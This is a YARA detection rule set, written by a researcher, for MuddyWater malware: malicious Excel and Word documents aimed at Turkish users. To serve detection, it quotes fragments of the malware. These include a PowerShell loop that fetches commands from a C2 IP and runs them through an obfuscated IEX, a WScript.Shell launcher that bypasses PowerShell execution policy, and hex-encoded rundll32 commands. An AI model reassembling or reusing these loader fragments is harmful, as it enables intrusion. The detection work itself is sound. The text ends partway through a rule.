/*
   YARA Rule Set
   Author: Arda Büyükkaya
   Date: 2022-02-02
   Identifier: Iranian APT MuddyWater targets Turkish users via malicious PDFs, executables
   Reference: Internal Research
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec {
   meta:
      description = "data - file 26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec"
   strings:
      $x1 = "C:\\Windows\\system32\\FM20.DLL" fullword ascii
      $x2 = "C:\\Users\\poopak\\AppData\\Local\\Temp\\Excel8.0\\MSForms.exd" fullword ascii
      $s3 = "*\\G{0D452EE1-E08F-101A-852E-02608C4D0BB4}#2.0#0#C:\\Windows\\system32\\FM20.DLL#Microsoft Forms 2.0 Object Library" fullword wide
      $s4 = "*\\G{7C0D9C4B-D689-4544-B2A4-82E8E8154916}#2.0#0#C:\\Users\\poopak\\AppData\\Local\\Temp\\Excel8.0\\MSForms.exd#Microsoft Forms " wide
      $s5 = "ExecuteExcel4Macro" fullword ascii
      $s6 = "Share your workbook with others and always work on the latest version for real-time collaboration to help get work done faster. " ascii
      $s7 = "Share your workbook with others and always work on the latest version for real-time collaboration to help get work done faster. " ascii
      $s8 = "_B_var_login" fullword ascii
      $s9 = "MsgBox ('User and Password is correct.')\"" fullword wide
      $s10 = "In order to view the content please click Enable Editing and Enable Content from the yellow bar above" fullword ascii
      $s11 = "r excel png logo" fullword wide
      $s12 = "Enhanced by intelligence, Excel learns your patterns, organizing your data to save you time. Create spreadsheets with ease from " ascii
      $s13 = "Get a better picture of your data" fullword ascii
      $s14 = "Work better together" fullword ascii
      $s15 = ") - r1J" fullword ascii
      $s16 = "-2]\\ #,##0.00\\)" fullword wide /* hex encoded string ' ' */
      $s17 = "Image result for microsoft excel logo png transparent" fullword wide
      $s18 = " 78 65 20 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 45 78 63 68 61 6e 67 65 2e 64 6c 6c 2c 53 74 61 72 74 22 20 26 26 20 44 4" wide /* hex encoded string 'xe C:\ProgramData\Exchange.dll,Start" && DEL "%~f0"' */
      $s19 = "63 6d 64 2e 65 78 65 20 2f 63 20 73 74 61 72 74 20 2f 62 20 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 74 74 2e 62 61 74" fullword wide /* hex encoded string 'cmd.exe /c start /b C:\ProgramData\tt.bat' */
      $s20 = "70 6f 77 65 72 73 68 65 6c 6c 20 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 72 75 6e 64 6c 6c 33 32 2e 65 78 65 20 43 3a 5c 50 72" wide /* hex encoded string 'powershell Start-Process rundll32.exe C:\ProgramData\Exchange.dll,Start' */
   condition:
      uint16(0) == 0xcfd0 and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c {
   meta:
      description = "data - file a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c"
   strings:
      $x1 = "C:\\Windows\\system32\\FM20.DLL" fullword ascii
      $x2 = "C:\\Users\\poopak\\AppData\\Local\\Temp\\Excel8.0\\MSForms.exd" fullword ascii
      $s3 = "*\\G{0D452EE1-E08F-101A-852E-02608C4D0BB4}#2.0#0#C:\\Windows\\system32\\FM20.DLL#Microsoft Forms 2.0 Object Library" fullword wide
      $s4 = "*\\G{7C0D9C4B-D689-4544-B2A4-82E8E8154916}#2.0#0#C:\\Users\\poopak\\AppData\\Local\\Temp\\Excel8.0\\MSForms.exd#Microsoft Forms " wide
      $s5 = "ExecuteExcel4Macro" fullword ascii
      $s6 = "Share your workbook with others and always work on the latest version for real-time collaboration to help get work done faster. " ascii
      $s7 = "Share your workbook with others and always work on the latest version for real-time collaboration to help get work done faster. " ascii
      $s8 = "_B_var_login" fullword ascii
      $s9 = "MsgBox ('User and Password is correct.')\"" fullword wide
      $s10 = "MsgBox ('User and Password is correct.')'" fullword ascii
      $s11 = "In order to view the content please click Enable Editing and Enable Content from the yellow bar above" fullword ascii
      $s12 = "r excel png logo" fullword wide
      $s13 = "Enhanced by intelligence, Excel learns your patterns, organizing your data to save you time. Create spreadsheets with ease from " ascii
      $s14 = "Get a better picture of your data" fullword ascii
      $s15 = "Work better together" fullword ascii
      $s16 = ") - r1J" fullword ascii
      $s17 = "-2]\\ #,##0.00\\)" fullword wide /* hex encoded string ' ' */
      $s18 = "Image result for microsoft excel logo png transparent" fullword wide
      $s19 = " 78 65 20 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 45 78 63 68 61 6e 67 65 2e 64 6c 6c 2c 53 74 61 72 74 22 20 26 26 20 44 4" wide /* hex encoded string 'xe C:\ProgramData\Exchange.dll,Start" && DEL "%~f0"' */
      $s20 = "63 6d 64 2e 65 78 65 20 2f 63 20 73 74 61 72 74 20 2f 62 20 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 74 74 2e 62 61 74" fullword wide /* hex encoded string 'cmd.exe /c start /b C:\ProgramData\tt.bat' */
   condition:
      uint16(0) == 0xcfd0 and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c_2 {
   meta:
      description = "data - file a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "3e6986d4dc7610c059aa8a51a61e30bcf509b7c2b5b4e931134c42384a0deea6"
   strings:
      $x1 = "C:\\Windows\\system32\\FM20.DLL" fullword ascii
      $x2 = "C:\\Users\\poopak\\AppData\\Local\\Temp\\Excel8.0\\MSForms.exd" fullword ascii
      $s3 = "*\\G{0D452EE1-E08F-101A-852E-02608C4D0BB4}#2.0#0#C:\\Windows\\system32\\FM20.DLL#Microsoft Forms 2.0 Object Library" fullword wide
      $s4 = "*\\G{7C0D9C4B-D689-4544-B2A4-82E8E8154916}#2.0#0#C:\\Users\\poopak\\AppData\\Local\\Temp\\Excel8.0\\MSForms.exd#Microsoft Forms " wide
      $s5 = "ExecuteExcel4Macro" fullword ascii
      $s6 = "Share your workbook with others and always work on the latest version for real-time collaboration to help get work done faster. " ascii
      $s7 = "Share your workbook with others and always work on the latest version for real-time collaboration to help get work done faster. " ascii
      $s8 = "_B_var_login" fullword ascii
      $s9 = "MsgBox ('User and Password is correct.')\"" fullword wide
      $s10 = "MsgBox ('User and Password is correct.')'" fullword ascii
      $s11 = "In order to view the content please click Enable Editing and Enable Content from the yellow bar above" fullword ascii
      $s12 = "r excel png logo" fullword wide
      $s13 = "Enhanced by intelligence, Excel learns your patterns, organizing your data to save you time. Create spreadsheets with ease from " ascii
      $s14 = "Get a better picture of your data" fullword ascii
      $s15 = "Work better together" fullword ascii
      $s16 = ") - r1J" fullword ascii
      $s17 = "-2]\\ #,##0.00\\)" fullword wide /* hex encoded string ' ' */
      $s18 = "Image result for microsoft excel logo png transparent" fullword wide
      $s19 = " 78 65 20 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 45 78 63 68 61 6e 67 65 2e 64 6c 6c 2c 53 74 61 72 74 22 20 26 26 20 44 4" wide /* hex encoded string 'xe C:\ProgramData\Exchange.dll,Start" && DEL "%~f0"' */
      $s20 = "63 6d 64 2e 65 78 65 20 2f 63 20 73 74 61 72 74 20 2f 62 20 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 74 74 2e 62 61 74" fullword wide /* hex encoded string 'cmd.exe /c start /b C:\ProgramData\tt.bat' */
   condition:
      uint16(0) == 0xcfd0 and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule sig_63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf {
   meta:
      description = "data - file 63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf"
   strings:
      $x1 = "C:\\WINDOWS\\system32\\FM20.DLL" fullword ascii
      $x2 = "C:\\Users\\pk\\AppData\\Local\\Temp\\Excel8.0\\MSForms.exd" fullword ascii
      $s3 = "*\\G{0D452EE1-E08F-101A-852E-02608C4D0BB4}#2.0#0#C:\\WINDOWS\\system32\\FM20.DLL#Microsoft Forms 2.0 Object Library" fullword wide
      $s4 = "*\\G{234FEE78-FB2C-43EF-B5C6-02EF502EED53}#2.0#0#C:\\Users\\pk\\AppData\\Local\\Temp\\Excel8.0\\MSForms.exd#Microsoft Forms 2.0 " wide
      $s5 = "ExecuteExcel4Macro" fullword ascii
      $s6 = "C:\\Windows\\System32\\stdole2" fullword ascii
      $s7 = "w.Exec" fullword ascii
      $s8 = "Share your workbook with others and always work on the latest version for real-time collaboration to help get work done faster. " ascii
      $s9 = "Share your workbook with others and always work on the latest version for real-time collaboration to help get work done faster. " ascii
      $s10 = "bgetfpmil" fullword ascii
      $s11 = "MsgBox ('User and Password is correct.')'" fullword ascii
      $s12 = "view the content please click Enable Editing and Enable Content from the yellow bar above" fullword ascii
      $s13 = "Enhanced by intelligence, Excel learns your patterns, organizing your data to save you time. Create spreadsheets with ease from " ascii
      $s14 = "Writ.tlb" fullword ascii
      $s15 = "Get a better picture of your data" fullword ascii
      $s16 = "Work better together" fullword ascii
      $s17 = "-2]\\ #,##0.00\\)" fullword wide /* hex encoded string ' ' */
      $s18 = "Image result for microsoft excel logo png transparent" fullword wide
      $s19 = " 6f 67 72 61 6d 44 61 74 61 5c 45 78 63 68 61 6e 67 65 2e 64 6c 6c 2c 53 74 61 72 74$" fullword ascii /* hex encoded string 'ogramData\Exchange.dll,Start' */
      $s20 = "43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 74 74 2e 62 61 74$" fullword ascii /* hex encoded string 'C:\ProgramData\tt.bat' */
   condition:
      uint16(0) == 0xcfd0 and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule sig_63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf_2 {
   meta:
      description = "data - file 63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "fff275f39ab9d6c282963f568dc62ca0c23456d9ccf22c8baedb23d3208b24fb"
   strings:
      $x1 = "C:\\WINDOWS\\system32\\FM20.DLL" fullword ascii
      $x2 = "C:\\Users\\pk\\AppData\\Local\\Temp\\Excel8.0\\MSForms.exd" fullword ascii
      $s3 = "*\\G{0D452EE1-E08F-101A-852E-02608C4D0BB4}#2.0#0#C:\\WINDOWS\\system32\\FM20.DLL#Microsoft Forms 2.0 Object Library" fullword wide
      $s4 = "*\\G{234FEE78-FB2C-43EF-B5C6-02EF502EED53}#2.0#0#C:\\Users\\pk\\AppData\\Local\\Temp\\Excel8.0\\MSForms.exd#Microsoft Forms 2.0 " wide
      $s5 = "ExecuteExcel4Macro" fullword ascii
      $s6 = "C:\\Windows\\System32\\stdole2" fullword ascii
      $s7 = "w.Exec" fullword ascii
      $s8 = "Share your workbook with others and always work on the latest version for real-time collaboration to help get work done faster. " ascii
      $s9 = "Share your workbook with others and always work on the latest version for real-time collaboration to help get work done faster. " ascii
      $s10 = "bgetfpmil" fullword ascii
      $s11 = "MsgBox ('User and Password is correct.')'" fullword ascii
      $s12 = "view the content please click Enable Editing and Enable Content from the yellow bar above" fullword ascii
      $s13 = "Enhanced by intelligence, Excel learns your patterns, organizing your data to save you time. Create spreadsheets with ease from " ascii
      $s14 = "Writ.tlb" fullword ascii
      $s15 = "Get a better picture of your data" fullword ascii
      $s16 = "Work better together" fullword ascii
      $s17 = "-2]\\ #,##0.00\\)" fullword wide /* hex encoded string ' ' */
      $s18 = "Image result for microsoft excel logo png transparent" fullword wide
      $s19 = " 6f 67 72 61 6d 44 61 74 61 5c 45 78 63 68 61 6e 67 65 2e 64 6c 6c 2c 53 74 61 72 74$" fullword ascii /* hex encoded string 'ogramData\Exchange.dll,Start' */
      $s20 = "43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 74 74 2e 62 61 74$" fullword ascii /* hex encoded string 'C:\ProgramData\tt.bat' */
   condition:
      uint16(0) == 0xcfd0 and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule sig_5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4 {
   meta:
      description = "data - file 5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4"
   strings:
      $x1 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x2 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x3 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s4 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s5 = "SystemWebProxy();$w.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.11.4" ascii
      $s6 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rdf:ab" ascii
      $s7 = "472.124 Safari/537.36|'+ $env:username;$w.timeout=40000;$r='';$r=(New-Object System.IO.StreamReader($w.GetResponse().GetResponse" ascii
      $s8 = "rundll32.exe pcwutl.dll,LaunchApplication  " fullword ascii
      $s9 = "rundll32.exe pcwutl.dll,LaunchApplication " fullword wide
      $s10 = "d5-ba3d-11da-ad31-d33d75182f1b\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\"><xmp:CreateDate>2021-09-13T17:26:48.964</xmp:CreateD" ascii
      $s11 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rdf:ab" ascii
      $s12 = "></rdf:Description><rdf:Description rdf:about=\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:dc=\"http://purl.org/dc/elemen" ascii
      $s13 = "\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\"/><rdf:Description rdf:about=\"uuid:f" ascii
      $s14 = "serName + \"\\links\\links.ps1\" , 0, True" fullword ascii
      $s15 = "\\Links\\LaId.vbs" fullword wide
      $s16 = "Stream())).ReadToEnd();&(\"{1}{2}{0}\" -f 'X','I','E') $r;}catch{}}" fullword ascii
      $s17 = " rundll" fullword ascii
      $s18 = "1.1/\"><dc:creator><rdf:Seq xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:li>pk</rdf:li></rdf:Seq>" fullword ascii
      $s19 = "</dc:creator></rdf:Description></rdf:RDF></x:xmpmeta>" fullword ascii
      $s20 = " /3/*2'*+*" fullword ascii /* hex encoded string '2' */
   condition:
      uint16(0) == 0xcfd0 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule c13cb1c9277324534075f807a3fcd24d0d3c024197c7437bf65db78f6a987f7a {
   meta:
      description = "data - file c13cb1c9277324534075f807a3fcd24d0d3c024197c7437bf65db78f6a987f7a"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "c13cb1c9277324534075f807a3fcd24d0d3c024197c7437bf65db78f6a987f7a"
   strings:
      $s1 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rdf:ab" ascii
      $s2 = "d5-ba3d-11da-ad31-d33d75182f1b\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\"><xmp:CreateDate>2019-04-04T00:43:59.295</xmp:CreateD" ascii
      $s3 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rdf:ab" ascii
      $s4 = "></rdf:Description><rdf:Description rdf:about=\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:dc=\"http://purl.org/dc/elemen" ascii
      $s5 = "\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\"/><rdf:Description rdf:about=\"uuid:f" ascii
      $s6 = "</dc:creator></rdf:Description></rdf:RDF></x:xmpmeta>" fullword ascii
      $s7 = "word/vbaProject.bin" fullword ascii
      $s8 = "word/_rels/vbaProject.bin.relsPK" fullword ascii
      $s9 = "word/_rels/vbaProject.bin.relsl" fullword ascii
      $s10 = "1.1/\"><dc:creator><rdf:Seq xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:li>Aurelia</rdf:li></rdf:Seq>" fullword ascii
      $s11 = " /3/*2'*+*" fullword ascii /* hex encoded string '2' */
      $s12 = "word/vbaData.xml" fullword ascii
      $s13 = "word/vbaProject.binPK" fullword ascii
      $s14 = "word/footer1.xml" fullword ascii
      $s15 = "word/_rels/footer1.xml.relsPK" fullword ascii
      $s16 = "word/media/image1.jpg" fullword ascii
      $s17 = "word/_rels/footer1.xml.rels" fullword ascii
      $s18 = "word/media/image2.png" fullword ascii
      $s19 = "FSCCSSC" fullword ascii
      $s20 = "Aurelia" fullword wide
   condition:
      uint16(0) == 0x4b50 and filesize < 200KB and
      8 of them
}

rule c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb {
   meta:
      description = "data - file c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb"
   strings:
      $x1 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x2 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x3 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s4 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s5 = "SystemWebProxy();$w.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.11.4" ascii
      $s6 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rdf:ab" ascii
      $s7 = "472.124 Safari/537.36|'+ $env:username;$w.timeout=40000;$r='';$r=(New-Object System.IO.StreamReader($w.GetResponse().GetResponse" ascii
      $s8 = "rundll32.exe pcwutl.dll,LaunchApplication  " fullword ascii
      $s9 = "rundll32.exe pcwutl.dll,LaunchApplication " fullword wide
      $s10 = "d5-ba3d-11da-ad31-d33d75182f1b\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\"><xmp:CreateDate>2021-09-13T17:26:48.964</xmp:CreateD" ascii
      $s11 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rdf:ab" ascii
      $s12 = "></rdf:Description><rdf:Description rdf:about=\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:dc=\"http://purl.org/dc/elemen" ascii
      $s13 = "\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\"/><rdf:Description rdf:about=\"uuid:f" ascii
      $s14 = "serName + \"\\links\\links.ps1\" , 0, True" fullword ascii
      $s15 = "\\Links\\LaId.vbs" fullword wide
      $s16 = "Stream())).ReadToEnd();&(\"{1}{2}{0}\" -f 'X','I','E') $r;}catch{}}" fullword ascii
      $s17 = " rundll" fullword ascii
      $s18 = "1.1/\"><dc:creator><rdf:Seq xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:li>pk</rdf:li></rdf:Seq>" fullword ascii
      $s19 = "</dc:creator></rdf:Description></rdf:RDF></x:xmpmeta>" fullword ascii
      $s20 = " /3/*2'*+*" fullword ascii /* hex encoded string '2' */
   condition:
      uint16(0) == 0xcfd0 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule data_main {
   meta:
      description = "data - file main.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "f45675f2a44f1c5a9eba95e85e5ea7defc15a54c6377746ba42cdfc6e4639b5a"
   strings:
      $x1 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x2 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x3 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s4 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s5 = "SystemWebProxy();$w.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.11.4" ascii
      $s6 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rdf:ab" ascii
      $s7 = "472.124 Safari/537.36|'+ $env:username;$w.timeout=40000;$r='';$r=(New-Object System.IO.StreamReader($w.GetResponse().GetResponse" ascii
      $s8 = "rundll32.exe pcwutl.dll,LaunchApplication  " fullword ascii
      $s9 = "rundll32.exe pcwutl.dll,LaunchApplication " fullword wide
      $s10 = "d5-ba3d-11da-ad31-d33d75182f1b\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\"><xmp:CreateDate>2021-09-13T17:26:48.964</xmp:CreateD" ascii
      $s11 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rdf:ab" ascii
      $s12 = "></rdf:Description><rdf:Description rdf:about=\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:dc=\"http://purl.org/dc/elemen" ascii
      $s13 = "\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\"/><rdf:Description rdf:about=\"uuid:f" ascii
      $s14 = "serName + \"\\links\\links.ps1\" , 0, True" fullword ascii
      $s15 = "\\Links\\LaId.vbs" fullword wide
      $s16 = "Stream())).ReadToEnd();&(\"{1}{2}{0}\" -f 'X','I','E') $r;}catch{}}" fullword ascii
      $s17 = " rundll" fullword ascii
      $s18 = "1.1/\"><dc:creator><rdf:Seq xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:li>pk</rdf:li></rdf:Seq>" fullword ascii
      $s19 = "</dc:creator></rdf:Description></rdf:RDF></x:xmpmeta>" fullword ascii
      $s20 = " /3/*2'*+*" fullword ascii /* hex encoded string '2' */
   condition:
      uint16(0) == 0xcfd0 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_42aa5a474abc9efd3289833eab9e72a560fee48765b94b605fac469739a515c1 {
   meta:
      description = "data - file 42aa5a474abc9efd3289833eab9e72a560fee48765b94b605fac469739a515c1"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "42aa5a474abc9efd3289833eab9e72a560fee48765b94b605fac469739a515c1"
   strings:
      $x1 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s2 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s3 = "SystemWebProxy();$w.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.11.4" ascii
      $s4 = "472.124 Safari/537.36|'+ $env:username;$w.timeout=40000;$r='';$r=(New-Object System.IO.StreamReader($w.GetResponse().GetResponse" ascii
      $s5 = "Stream())).ReadToEnd();&(\"{1}{2}{0}\" -f 'X','I','E') $r;}catch{}}" fullword ascii
   condition:
      uint16(0) == 0x6f66 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34 {
   meta:
      description = "data - file a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34"
   strings:
      $x1 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x2 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x3 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s4 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s5 = "SystemWebProxy();$w.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.11.4" ascii
      $s6 = "http://canarytokens.com/tags/traffic/images/azp6ai8pg5aq0c619ur0qzi6h/post.jsp" fullword wide
      $s7 = "472.124 Safari/537.36|'+ $env:username;$w.timeout=40000;$r='';$r=(New-Object System.IO.StreamReader($w.GetResponse().GetResponse" ascii
      $s8 = "rundll32.exe pcwutl.dll,LaunchApplication  " fullword ascii
      $s9 = "rundll32.exe pcwutl.dll,LaunchApplication " fullword wide
      $s10 = "serName + \"\\links\\links.ps1\" , 0, True" fullword ascii
      $s11 = "\\Links\\gKN.vbs" fullword wide
      $s12 = "Stream())).ReadToEnd();&(\"{1}{2}{0}\" -f 'X','I','E') $r;}catch{}}" fullword ascii
      $s13 = "llehS*tpircSW" fullword wide
      $s14 = "RegWrite" fullword wide
      $s15 = "undll32." fullword ascii
      $s16 = "pircSW\") , \"*\"" fullword ascii
      $s17 = "unction " fullword ascii
      $s18 = "        }" fullword ascii /* reversed goodware string '}        ' */
      $s19 = "zEyeY$" fullword ascii
      $s20 = "Aurelia" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34_2 {
   meta:
      description = "data - file a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "9e614ba0fe16b63913f535fe74ef84a8352bd52d3ef4cbde1ee6c8f8953915c3"
   strings:
      $x1 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x2 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x3 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s4 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
